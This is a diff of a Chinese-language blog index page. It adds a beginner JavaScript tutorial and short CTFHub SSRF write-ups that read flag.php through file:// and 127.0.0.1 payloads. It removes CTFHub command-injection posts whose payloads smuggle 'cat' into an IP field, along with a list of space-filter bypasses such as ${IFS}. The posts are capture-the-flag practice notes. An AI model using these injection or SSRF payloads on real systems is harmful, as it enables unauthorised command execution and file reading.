@@ -152,6 +152,160 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-JavaScript学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="JavaScript学习"><a href="#JavaScript学习" class="headerlink" title="JavaScript学习"></a>JavaScript学习</h2><h2 id="1-输出"><a href="#1-输出" class="headerlink" title="1.输出"></a>1.输出</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一个页面<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;tip&quot;</span>&gt;</span>我的第一个为段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;我的第一个弹窗&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--弹窗--&gt;</span><span class="comment">&lt;!--alert()里的字符需要用引号包围--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;我的第一个输出 \ 我的第二个输出&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--直接在页面输出文字,同样字符加引号--&gt;</span><span class="comment">&lt;!-- \ 换行--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;tip&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;段落已修改&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--访问id元素并用inner修改元素--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    a=<span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">    b=<span class="number">2</span>;</span></span><br><span class="line"><span class="language-javascript">    c=a+b;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!--控制台输出c的值--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://43.142.12.129/js/js1.html">http://43.142.12.129/js/js1.html</a></p>
+<h2 id="2-变量"><a href="#2-变量" class="headerlink" title="2.变量"></a>2.变量</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>typeof 操作符返回变量的类型<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;tip&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> a = <span class="number">1</span>;                                                   <span class="comment">//定义数字变量，只有一种类型</span></span></span><br><span class="line"><span class="language-javascript">                                                    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> b = <span class="string">&quot;tianfeng&quot;</span>;                                         <span class="comment">//定义字符变量，用引号包围</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> c = <span class="literal">false</span>;                                              <span class="comment">//定义布尔型变量</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;t&quot;</span>,<span class="string">&quot;f&quot;</span>);                                 <span class="comment">//定义数组</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/*  var d = new Array();</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        d[0] = &quot;t&quot;;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        d[1] = &quot;f&quot;;</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">*/</span>  </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> e = &#123;<span class="attr">firstname</span>:<span class="string">&quot;feng&quot;</span>,<span class="attr">lastname</span>:<span class="string">&quot;tian&quot;</span>,<span class="attr">id</span>:<span class="number">2021412977</span>&#125;;  <span class="comment">//定义对象变量</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> f = <span class="literal">null</span>;                                              <span class="comment">//null清空变量值,Undefined表示变量不含值</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;tip&quot;</span>).<span class="property">innerHTML</span> = </span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">typeof</span> a + <span class="string">&quot;&lt;br&gt;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">typeof</span> b + <span class="string">&quot;&lt;br&gt;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">typeof</span> c + <span class="string">&quot;&lt;br&gt;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">typeof</span> d + <span class="string">&quot;&lt;br&gt;&quot;</span> +</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">typeof</span> e + <span class="string">&quot;&lt;br&gt;&quot;</span> ;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://43.142.12.129/js/js2.html">http://43.142.12.129/js/js2.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/07/06/JavaScript%E5%AD%A6%E4%B9%A0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctfhub ssrf 伪协议读取文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ctfhub-ssrf-伪协议读取文件"><a href="#ctfhub-ssrf-伪协议读取文件" class="headerlink" title="ctfhub ssrf 伪协议读取文件"></a>ctfhub ssrf 伪协议读取文件</h1><p>直接用伪协议读取flag.php,构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://XXXXXX/?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>注意:网站的目录一般都在&#x2F;var&#x2F;www&#x2F;html&#x2F;下</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/06/16/ctfhub%20ssrf%20%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctfhub ssrf 内网访问" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ctfhub-ssrf-内网访问"><a href="#ctfhub-ssrf-内网访问" class="headerlink" title="ctfhub ssrf 内网访问"></a>ctfhub ssrf 内网访问</h1><p>题目提示访问127.0.0.1的flag.php,构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxxxx/?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/06/16/ctfhub%20ssrf%20%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-ctfhub 盲注" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -564,155 +718,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/05/23/ctfhub%20rce%20%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ctfhub rce 命令注入过滤空格" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="ctfhub-rce-命令注入过滤空格"><a href="#ctfhub-rce-命令注入过滤空格" class="headerlink" title="ctfhub rce 命令注入过滤空格"></a>ctfhub rce 命令注入过滤空格</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat&lt;flag_297492904330284.php|base64</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">过滤空格绕过</span><br><span class="line">%09（url传递）</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;</span><br><span class="line">&#123;cat,flag&#125;</span><br></pre></td></tr></table></figure>
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/05/22/ctfhub%20rce%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ctfhub rce 命令注入过滤cat" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="ctfhub-rce-命令注入过滤cat"><a href="#ctfhub-rce-命令注入过滤cat" class="headerlink" title="ctfhub rce 命令注入过滤cat"></a>ctfhub rce 命令注入过滤cat</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;ca\t *flag_1450220120038.php | base64</span><br></pre></td></tr></table></figure>
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/05/22/ctfhub%20rce%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4cat/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ctfhub rce 命令注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip &amp; cat *.php | base64</span><br></pre></td></tr></table></figure>
-
-<h1 id="ctfhub-rce-命令注入"><a href="#ctfhub-rce-命令注入" class="headerlink" title="ctfhub rce 命令注入"></a>ctfhub rce 命令注入</h1>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/05/22/ctfhub%20rce%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">展开全文 >></a>
         </p>
       
 
